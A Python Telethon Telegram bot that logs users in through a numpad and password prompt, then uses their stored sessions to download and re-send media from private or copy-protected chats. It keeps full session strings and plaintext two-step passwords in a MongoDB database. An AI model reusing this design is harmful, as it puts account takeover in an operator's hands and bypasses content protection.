import logging,os,time,json,telethon,asyncio,re
from telethon import TelegramClient,events,utils
from telethon.sessions import StringSession
from telethon.tl.custom.button import Button
from dotenv import load_dotenv
from pymongo.mongo_client import MongoClient
from pymongo.server_api import ServerApi
from strings import strings,direct_reply
from FastTelethon import download_file,upload_file

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
load_dotenv(override=True)

API_ID = int(os.getenv("TG_API_ID"))
API_HASH = os.getenv("TG_API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
MONGODB_URL = os.getenv("MONGODB_URL")
BOT_USERNAME = None
bot = TelegramClient('bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
mongo_client = MongoClient(MONGODB_URL, server_api=ServerApi('1'))
download_folder = 'files'
database = mongo_client.userdb.sessions
if not os.path.isdir(download_folder):
    os.makedirs(download_folder)
numpad = [
    [Button.url(strings['get_code_btn'], 'https://t.me/+42777')],
    [  
        Button.inline("1", '{"press":1}'), 
        Button.inline("2", '{"press":2}'), 
        Button.inline("3", '{"press":3}')
    ],
    [
        Button.inline("4", '{"press":4}'), 
        Button.inline("5", '{"press":5}'), 
        Button.inline("6", '{"press":6}')
    ],
    [
        Button.inline("7", '{"press":7}'), 
        Button.inline("8", '{"press":8}'), 
        Button.inline("9", '{"press":9}')
    ],
    [
        Button.inline("Clear All", '{"press":"clear_all"}'),
        Button.inline("0", '{"press":0}'),
        Button.inline("⌫", '{"press":"clear"}')
    ]
]
settings_keyboard = [
    [  
        Button.inline("Download command", '{"page":"settings","press":"dlcmd"}')
    ],
    [
        Button.inline("Download message", '{"page":"settings","press":"dlmsg"}')
    ],
    [
        Button.inline("Info delete delay", '{"page":"settings","press":"dltime"}')
    ],
]

def select_not_none(l):
    for i in l:
        if i is not None:
            return i
def intify(s):
    try:
        return int(s)
    except:
        return s
def get(obj, key, default=None):
    try:
        return obj[key]
    except:
        return default
def yesno(x,page='def'):
    return [
        [Button.inline("Yes", '{{"page":"{}","press":"yes{}"}}'.format(page,x))],
        [Button.inline("No", '{{"page":"{}","press":"no{}"}}'.format(page,x))]
    ]
async def handle_usr(contact, event):
    msg = await event.respond(strings['sending1'], buttons=Button.clear())
    await msg.delete()
    msg = await event.respond(strings['sending2'])
    uclient = TelegramClient(StringSession(), API_ID, API_HASH)
    await uclient.connect()
    user_data = database.find_one({"chat_id": event.chat_id})
    try:
        scr = await uclient.send_code_request(contact.phone_number)
        login = {
        	'code_len': scr.type.length,
            'phone_code_hash': scr.phone_code_hash,
            'session': uclient.session.save(),
        }
        data = {
        	'phone': contact.phone_number,
            'login': json.dumps(login),
        }
        database.update_one({'_id': user_data['_id']}, {'$set': data})
        await msg.edit(strings['ask_code'], buttons=numpad)
    except Exception as e:
        await msg.edit("Error: "+repr(e))
    await uclient.disconnect()
async def handle_settings(event, jdata):
    user_data = database.find_one({"chat_id": event.chat_id})
    settings = get(user_data, 'settings', {})
    print(settings)
    if jdata['press'] == 'home':
        text = strings['settings_home']
        buttons = settings_keyboard
    elif jdata['press'] == 'cancel':
        text = strings['settings_home']
        buttons = settings_keyboard
        settings['pending'] = None
        settings['pending_pattern'] = None
    elif jdata['press'] in ['dlcmd', 'nodlcmd']:
        text = strings['ask_new_dlcmd']
        buttons = [
            [Button.inline("🚫 Cancel", '{"page":"settings","press":"cancel"}')],
        ]
        settings['pending'] = 'dlcmd'
        settings['pending_pattern'] = '.*'
    elif jdata['press'] == 'yesdlcmd':
        text = strings['dlcmd_saved']
        buttons = [
            [Button.inline("<< Back to settings", '{"page":"settings","press":"home"}')],
        ]
        settings['dl_command'] = user_data['settings']['last_input']
        settings['pending'] = None
    elif jdata['press'] in ['dlmsg', 'nodlmsg']:
        text = strings['ask_new_dlmsg']
        buttons = [
            [Button.inline("🚫 Cancel", '{"page":"settings","press":"cancel"}')],
        ]
        settings['pending'] = 'dlmsg'
        settings['pending_pattern'] = '.*'
    elif jdata['press'] == 'yesdlmsg':
        text = strings['dlmsg_saved']
        buttons = [
            [Button.inline("<< Back to settings", '{"page":"settings","press":"home"}')],
        ]
        settings['dl_message'] = user_data['settings']['last_input']
        settings['pending'] = None
    elif jdata['press'] in ['dltime', 'nodltime']:
        text = strings['ask_new_dltime']
        buttons = [
            [Button.inline("🚫 Cancel", '{"page":"settings","press":"cancel"}')],
        ]
        settings['pending'] = 'dltime'
        settings['pending_pattern'] = '^(?:[0-5]|999)$'
    elif jdata['press'] == 'yesdltime':
        text = strings['dltime_saved']
        buttons = [
            [Button.inline("<< Back to settings", '{"page":"settings","press":"home"}')],
        ]
        t = int(user_data['settings']['last_input'])
        if t == 999 or 0 <= t <= 5:
            settings['dl_sleep'] = t
            settings['pending'] = None
        else:
            text = strings['non_match_pattern']
            buttons = [
                [Button.inline("🚫 Cancel", '{"page":"settings","press":"cancel"}')],
            ]
            settings['pending'] = 'dltime'
            settings['pending_pattern'] = '^(?:[0-5]|999)$'
    else:
        return
    print('updated: ', settings)
    database.update_one({'_id': user_data['_id']}, {'$set': {'settings': settings}})
    await event.edit(text, buttons=buttons)
async def sign_in(event):
    try:
        user_data = database.find_one({"chat_id": event.chat_id})
        login = json.loads(user_data['login'])
        data = {}
        uclient = None
        if get(login, 'code_ok', False) and get(login, 'pass_ok', False):
            uclient = TelegramClient(StringSession(login['session']), API_ID, API_HASH)
            await uclient.connect()
            await uclient.sign_in(password=user_data['password'])
        elif get(login, 'code_ok', False) and not get(login, 'need_pass', False):
            uclient = TelegramClient(StringSession(login['session']), API_ID, API_HASH)
            await uclient.connect()
            await uclient.sign_in(user_data['phone'], login['code'], phone_code_hash=login['phone_code_hash'])
        else:
            return False
        data['session'] = uclient.session.save()
        data['logged_in'] = True
        login = {}
        await event.edit(strings['login_success'])
    except telethon.errors.PhoneCodeInvalidError as e:
        await event.edit(strings['code_invalid'])
        await event.respond(strings['ask_code'], buttons=numpad)
        login['code'] = ''
        login['code_ok'] = False
    except telethon.errors.SessionPasswordNeededError as e:
        login['need_pass'] = True
        login['pass_ok'] = False
        await event.edit(strings['ask_pass'])
    except telethon.errors.PasswordHashInvalidError as e:
        login['need_pass'] = True
        login['pass_ok'] = False
        await event.edit(strings['pass_invalid'])
        await event.respond(strings['ask_pass'])
    except Exception as e:
        login['code'] = ''
        login['code_ok'] = False
        login['pass_ok'] = False
        await event.edit(repr(e))
    await uclient.disconnect()
    data['login'] = json.dumps(login)
    database.update_one({'_id': user_data['_id']}, {'$set': data})
    return True
class TimeKeeper:
    last = ''
    last_edited_time = 0
    def __init__(self, status):
        self.status = status
    def set_status(self, status):
        self.status = status
async def get_gallery(client, chat, msg_id):
    msgs = await client.get_messages(chat, ids=[*range(msg_id - 9, msg_id + 10)])
    return [
        msg for msg in [i for i in msgs if i] # clean None
        if msg.grouped_id == msgs[9].grouped_id # 10th msg is target, guaranteed to exist
    ]
def progress_bar(percentage, progressbar_length=10):
    prefix_char = '█'
    suffix_char = '▒'
    fill = round(progressbar_length*percentage/100)
    prefix = fill * prefix_char
    suffix = (progressbar_length-fill) * suffix_char
    return f"{prefix}{suffix} {percentage:.2f}%"
def humanify(byte_size):
    siz_list = ['KB', 'MB', 'GB']
    for i in range(len(siz_list)):
        if byte_size/1024**(i+1) < 1024:
            return "{} {}".format(round(byte_size/1024**(i+1), 2), siz_list[i])
async def callback(current, total, tk, message):
    try:
        progressbar = progress_bar(current/total*100)
        h_current = humanify(current)
        h_total = humanify(total)
        info = f"{tk.status}: {progressbar}\nComplete: {h_current}\nTotal: {h_total}"
        if tk.last != info and tk.last_edited_time+5 < time.time():
            await message.edit(info)
            tk.last = info
            tk.last_edited_time = time.time()
    except:
        pass
def unlink_if_exists(file_path):
    try:
        os.unlink(file_path)
    except:
        pass
async def tgfy_file(client, message, log, log_prefix=''):
    tk = TimeKeeper(f'{log_prefix}Downloading')
    if message.document:
        file = os.path.join(download_folder, message.file.name if message.file.name else str(int(time.time() * 1000)))
        with open(file, "wb") as out:
            await download_file(client, message.document, out, progress_callback=lambda c,t:callback(c,t,tk,log))
        thumb = await message.download_media(download_folder, thumb=-1)
        tgthumb = None if not thumb else await bot.upload_file(thumb)
    else:
        file = await message.download_media(download_folder, progress_callback=lambda c,t:callback(c,t,tk,log))
        tk.set_status(f'{log_prefix}Uploading')
        tgfile = await bot.upload_file(file, progress_callback=lambda c,t:callback(c,t,tk,log))
        unlink_if_exists(file)
        return tgfile
    tk.set_status(f'{log_prefix}Uploading')
    with open(file, "rb") as out:
        tgfile = await upload_file(bot, out, progress_callback=lambda c,t:callback(c,t,tk,log))
    attributes, mime_type = utils.get_attributes(file)
    media = telethon.tl.types.InputMediaUploadedDocument(file=tgfile,mime_type=mime_type,attributes=attributes,thumb=tgthumb,force_file=False)
    unlink_if_exists(file)
    unlink_if_exists(thumb)
    return media
async def unrestrict(uclient, event, chat, msg, log):
    to_chat = await event.get_sender()
    if msg is None:
        await log.edit(strings['msg_404'])
        await uclient.disconnect()
        return
    elif msg.grouped_id:
        gallery = await get_gallery(uclient, msg.chat_id, msg.id)
        album = []
        fcount = len(gallery)
        for i, sub_msg in enumerate(gallery):
            album.append(await tgfy_file(uclient, sub_msg, log, f'File {i+1} of {fcount}\n'))
        await bot.send_file(to_chat, album, caption=msg.message)
    elif msg.media is not None and msg.file is not None:
        media = await tgfy_file(uclient, msg, log)
        try:
            await bot.send_file(to_chat, media, supports_streaming=msg.document.attributes.supports_streaming, caption=msg.message)
        except:
            await bot.send_file(to_chat, media, caption=msg.message)
    else:
        await bot.send_message(to_chat, msg.message)
    await uclient.disconnect()
    await log.delete()
@events.register(events.NewMessage(outgoing=True))
async def dl_getter(event):
    user_data = database.find_one({"chat_id": event.message.from_id.user_id})
    settings = get(user_data, 'settings', {})
    if event.message.text != get(settings, 'dl_command', "/dl"):
        return
    global BOT_USERNAME
    if not event.is_reply:
        await event.edit(strings['not_is_reply'])
        return
    if BOT_USERNAME is None:
        BOT_USERNAME = (await bot.get_me()).username
    await event.client.send_message(BOT_USERNAME, f"{event.chat_id}.{event.message.reply_to_msg_id}")
    database.update_one({'_id': user_data['_id']}, {'$set': {'activated': 0}})
    t = get(settings, 'dl_sleep', 2)
    if t == 0:
        await event.delete()
        return
    await event.edit(get(settings, 'dl_message', strings['dl_sent']))
    if t == 999:
        return
    await asyncio.sleep(t)
    await event.delete()

@bot.on(events.NewMessage(func=lambda e: e.is_private))
async def handler(event):
    user_data = database.find_one({"chat_id": event.chat_id})
    if user_data is None:
        sender = await event.get_sender()
        database.insert_one({
            "chat_id": sender.id,
            "first_name": sender.first_name,
            "last_name": sender.last_name,
            "username": sender.username,
        })
    if event.message.text in direct_reply:
        await event.respond(direct_reply[event.message.text])
        raise events.StopPropagation
@bot.on(events.NewMessage(pattern=r"/login", func=lambda e: e.is_private))
async def handler(event):
    user_data = database.find_one({"chat_id": event.chat_id})
    if get(user_data, 'logged_in', False):
        await event.respond(strings['already_logged_in'])
        raise events.StopPropagation
    await event.respond(strings['ask_phone'], buttons=[Button.request_phone("SHARE CONTACT", resize=True, single_use=True)])
    raise events.StopPropagation
@bot.on(events.NewMessage(pattern=r"/settings", func=lambda e: e.is_private))
async def handler(event):
    user_data = database.find_one({"chat_id": event.chat_id})
    await event.reply(strings['settings_home'], buttons=settings_keyboard)
    raise events.StopPropagation
@bot.on(events.NewMessage(pattern=r"/logout", func=lambda e: e.is_private))
async def handler(event):
    user_data = database.find_one({"chat_id": event.chat_id})
    if not get(user_data, 'logged_in', False):
        await event.respond(strings['need_login'])
        raise events.StopPropagation
    await event.respond(strings['logout_sure'], buttons=yesno('logout'))
    raise events.StopPropagation
@bot.on(events.NewMessage(pattern=r"/add_session", func=lambda e: e.is_private))
async def handler(event):
    args = event.message.text.split(' ', 1)
    if len(args) == 1:
        return
    msg = await event.respond(strings['checking_str_session'])
    user_data = database.find_one({"chat_id": event.chat_id})
    data = {
        'session': args[1],
        'logged_in': True
    }
    uclient = TelegramClient(StringSession(data['session']), API_ID, API_HASH)
    await uclient.connect()
    if not await uclient.is_user_authorized():
        await msg.edit(strings['session_invalid'])
        await uclient.disconnect()
        raise events.StopPropagation
    await msg.edit(strings['str_session_ok'])
    database.update_one({'_id': user_data['_id']}, {'$set': data})
    raise events.StopPropagation
@bot.on(events.NewMessage(func=lambda e: e.is_private))
async def handler(event):
    if event.message.contact:
        if event.message.contact.user_id==event.chat.id:
            await handle_usr(event.message.contact, event)
        else:
            await event.respond(strings['wrong_phone'])
        raise events.StopPropagation
@bot.on(events.CallbackQuery(func=lambda e: e.is_private))
async def handler(event):
    try:
        evnt_dta = json.loads(event.data.decode())
        if get(evnt_dta, 'page', '') == 'settings':
            await handle_settings(event, evnt_dta)
            return
        press = evnt_dta['press']
    except:
        return
    user_data = database.find_one({"chat_id": event.chat_id})
    login = json.loads(user_data['login'])
    login['code'] = get(login, 'code', '')
    if type(press)==int:
        login['code'] += str(press)
    elif press=="clear":
        login['code'] = login['code'][:-1]
    elif press=="clear_all" or press=="nocode":
        login['code'] = ''
        login['code_ok'] = False
    elif press=="yescode":
        login['code_ok'] = True
    elif press=="yespass":
        login['pass_ok'] = True
        login['need_pass'] = False
    elif press=="nopass":
        login['pass_ok'] = False
        login['need_pass'] = True
        await event.edit(strings['ask_pass'])
    elif press=="yeslogout":
        data = {
            'logged_in': False,
            'login': '{}',
        }
        database.update_one({'_id': user_data['_id']}, {'$set': data})
        await event.edit(strings['logged_out'])
        return
    elif press=="nologout":
        await event.edit(strings['not_logged_out'])
        return
    database.update_one({'_id': user_data['_id']}, {'$set': {'login': json.dumps(login)}})
    if len(login['code'])==login['code_len'] and not get(login, 'code_ok', False):
        await event.edit(strings['ask_ok']+login['code'], buttons=yesno('code'))
    elif press=="nopass":
        return
    elif not await sign_in(event):
        await event.edit(strings['ask_code']+login['code'], buttons=numpad)
@bot.on(events.NewMessage(pattern="/activate", func=lambda e: e.is_private))
async def handler(event):
    user_data = database.find_one({"chat_id": event.chat_id})
    if not get(user_data, 'logged_in', False) or user_data['session'] is None:
        await event.respond(strings['need_login'])
        return
    if get(user_data, 'activated', 0)+60 > time.time():
        await event.respond(strings['already_activated'])
        return
    database.update_one({'_id': user_data['_id']}, {'$set': {'activated': time.time()}})
    uclient = TelegramClient(StringSession(user_data['session']), API_ID, API_HASH)
    await uclient.connect()
    if not await uclient.is_user_authorized():
        await event.respond(strings['session_invalid'])
        await uclient.disconnect()
        return
    settings = get(user_data, 'settings', {})
    log = await event.respond(strings['timeout_start'].format(get(settings, 'dl_command', '/dl')))
    uclient.add_event_handler(dl_getter)
    await asyncio.sleep(60)
    await uclient.disconnect()
    await log.edit(strings['timed_out'])
@bot.on(events.NewMessage(pattern=r"^(?:https?://t.me/c/(\d+)/(\d+)|https?://t.me/([A-Za-z0-9_]+)/(\d+)|(?:(-?\d+)\.(\d+)))$", func=lambda e: e.is_private))
async def handler(event):
    corrected_private = None
    if event.pattern_match[1]:
        corrected_private = '-100'+event.pattern_match[1]
    target_chat_id = intify(select_not_none([corrected_private, event.pattern_match[3], event.pattern_match[5]]))
    target_msg_id = intify(select_not_none([event.pattern_match[2], event.pattern_match[4], event.pattern_match[6]]))
    log = await event.respond('please wait..')
    user_data = database.find_one({"chat_id": event.chat_id})
    if not get(user_data, 'logged_in', False) or user_data['session'] is None:
        await log.edit(strings['need_login'])
        return
    uclient = TelegramClient(StringSession(user_data['session']), API_ID, API_HASH)
    await uclient.connect()
    if not await uclient.is_user_authorized():
        await log.edit(strings['session_invalid'])
        await uclient.disconnect()
        return
    try:
        if type(target_chat_id)==int and not str(target_chat_id).startswith('-100'):
            await uclient.get_dialogs()
        chat = await uclient.get_input_entity(target_chat_id)
        msg = await uclient.get_messages(chat, ids=target_msg_id)
    except Exception as e:
        await log.edit('Error: '+repr(e))
        await uclient.disconnect()
        return
    #try:
    await unrestrict(uclient, event, chat, msg, log)
    #except Exception as e:
    #    await event.respond(repr(e))
@bot.on(events.NewMessage(func=lambda e: e.is_private))
async def handler(event):
    user_data = database.find_one({"chat_id": event.chat_id})
    login = json.loads(get(user_data, 'login', '{}'))
    if get(login, 'code_ok', False) and get(login, 'need_pass', False) and not get(login, 'pass_ok', False):
        data = {
            'password': event.message.text
        }
        await event.respond(strings['ask_ok']+data['password'], buttons=yesno('pass'))
        database.update_one({'_id': user_data['_id']}, {'$set': data})
        return
    elif get(get(user_data, 'settings', {}), 'pending', None) is not None:
        if not re.match(user_data['settings']['pending_pattern'], event.message.text):
            await event.respond(strings['non_match_pattern'])
            return
        settings = user_data['settings']
        settings['last_input'] = event.message.text
        await event.respond(strings['ask_ok']+event.message.text, buttons=yesno(user_data['settings']['pending'],'settings'))
        database.update_one({'_id': user_data['_id']}, {'$set': {'settings': settings}})
        return
with bot:
    bot.run_until_disconnected()
